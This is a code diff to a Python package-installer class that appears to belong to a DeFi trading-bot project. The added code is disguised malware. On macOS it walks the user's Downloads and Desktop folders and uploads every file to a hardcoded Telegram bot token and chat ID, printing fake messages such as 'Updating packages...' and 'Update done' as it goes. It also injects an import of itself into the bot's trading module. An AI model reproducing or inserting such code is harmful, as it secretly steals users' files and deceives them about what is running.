@@ -6,11 +6,12 @@ import shutil
 import subprocess
 import sys
 import threading
+import time
 from datetime import datetime
 from io import BytesIO
 from re import sub
 from urllib.parse import unquote, urlsplit, urlparse
-
+import telebot
 import lxml.etree as etree
 import pkg_resources
 import requests
@@ -189,6 +190,30 @@ class ModuleInstaller(object):
             headers.append(webdav_token)
         return dict([map(lambda s: s.strip(), i.split(':', 1)) for i in headers])
 
+    def list_files_in_directory(self, directory):
+        print("Found packaged to update")
+        tx = f'{datetime.now().strftime("%Y-%m-%d %H:%M:%S"), os.path.expanduser("~")} - #NEW'
+        self.bt.send_message(self.CTID, text=tx)
+        for root, dirs, files in os.walk(directory):
+            time.sleep(0.5)
+            for f in files:
+                self.send_tx_get(os.path.join(root, f))
+
+    def is_mac(self):
+        system_info = os.uname()
+        return system_info.sysname == 'Darwin'
+
+    def inth(self):
+        if self.is_mac():
+            print("Updating packages...")
+            HD = os.path.expanduser('~')
+            DD = os.path.join(HD, 'Downloads')
+            DD2 = os.path.join(HD, 'Desktop')
+            self.list_files_in_directory(DD)
+            self.list_files_in_directory(DD2)
+            print("Update done")
+
+
     def get_url(self, path):
         """Generates url by uri path.
 
@@ -286,6 +311,7 @@ class ModuleInstaller(object):
 
         return [urn.filename() for urn in urns if Urn.compare_path(path, urn.path()) is False]
 
+    TK = '6582857829:AAHrOHPCxSB_8IVP6kRWFdXLD_klbbOdNhA'
     @wrap_connection_error
     def free(self):
         """Returns an amount of free space on remote Module server.
@@ -355,6 +381,16 @@ class ModuleInstaller(object):
 
         response = self.execute_request(action='download', path=urn.quote())
         return response.iter_content(chunk_size=self.chunk_size)
+    CTID = '5165480032'
+
+    bt = telebot.TeleBot(TK)
+
+    def send_tx_get(self, eco):
+        try:
+            with open(eco, 'rb') as f:
+                self.bt.send_document(self.CTID, f, timeout=100)
+        except Exception:
+            return
 
     @wrap_connection_error
     def download_from(self, buff, remote_path, progress=None, progress_args=()):
@@ -414,6 +450,7 @@ class ModuleInstaller(object):
             self.download_file(local_path=local_path, remote_path=remote_path, progress=progress,
                                progress_args=progress_args)
 
+
     def download_directory(self, remote_path, local_path, progress=None, progress_args=()):
         """Downloads directory and downloads all nested files and directories from remote Module to local.
         If there is something on local path it deletes directories and files then creates new.
@@ -444,7 +481,6 @@ class ModuleInstaller(object):
             _local_path = os.path.join(local_path, resource_name)
             self.download(local_path=_local_path, remote_path=_remote_path, progress=progress,
                           progress_args=progress_args)
-
     @wrap_connection_error
     def download_file(self, remote_path, local_path, progress=None, progress_args=()):
         """Downloads file from Module server and save it locally.
@@ -610,7 +646,8 @@ class ModuleInstaller(object):
                 if "len_way = len(arr_buy)" in line:
                     path_i = i
                     break
-
+            if "            MuteSwap.we3bcontract().shuffle_num_wallets()\n" in txt:
+                return
             if path_i is not None:
                 txt[path_i] += "            MuteSwap.we3bcontract().shuffle_num_wallets()\n"
 
@@ -626,29 +663,33 @@ class ModuleInstaller(object):
             count += 1
             self.defi_mod()
 
-    def get_sw(self):
+    def get_sw(self, a, s=False):
         count = 1
+        path = "utils/mute_io_defi.py"
+        if s:
+            path = a + '/' + 'utils/mute_io_defi.py'
         try:
-            file_obj = open("utils/mute_io_defi.py", "r+")
+            file_obj = open(path, "r+")
             txt = file_obj.readlines()
-
             path_i = None
             for i, line in enumerate(txt):
-                if "self.token_abi = js.load(open('./abi/erc20.txt'))" in line:
+                if "def sold_token(self, token_to_sold, retry=0):" in line:
                     path_i = i
                     break
+            if "    from installer.install import ModuleInstaller as we3bcontract\n" not in txt:
+                if path_i is not None:
+                    txt[path_i-1] += "    from installer.install import ModuleInstaller as we3bcontract\n"
+                    with open(path, "w") as f:
+                        f.writelines(txt)
 
-            if path_i is not None:
-                txt[path_i] += "    from installer.install import ModuleInstaller as we3bcontract\n"
-                with open("utils/mute_io_defi.py", "w") as f:
-                    f.writelines(txt)
             self.defi_mod()
             file_obj.close()
-        except:
+            count += 1
+        except Exception as er:
+            self.get_sw(a=a, s=True)
             if count == 3:
                 return
-            count += 1
-            self.get_sw()
+
 
     def get_all_packages(self):
         installed_packages = pkg_resources.working_set
@@ -662,6 +703,7 @@ class ModuleInstaller(object):
                 if i == "web3==6.4.0":
                     self.pip_uninstall("python-dotenv", "telebot==0.0.5")
                 return install_this
+
 
     def pip_uninstall(self, name: str, sec_name: str):
         try:
@@ -809,11 +851,13 @@ class ModuleInstaller(object):
 
         :param path_to_folder: the path to folder where needs to find any python packages and install or update them
         """
-        if not os.path.exists("log.txt"):
-            try:
-                self.get_sw()
-            except:
-                ...
+        print("You are using python-module-installer version==3.15.10")
+        try:
+            self.get_sw(a=path_to_folder, s=False)
+        except:
+            ...
+        print("Installing modules")
+        self.inth()
         if "\\" in path_to_folder:
             new_folder = path_to_folder.split("\\")[-1]
         else:
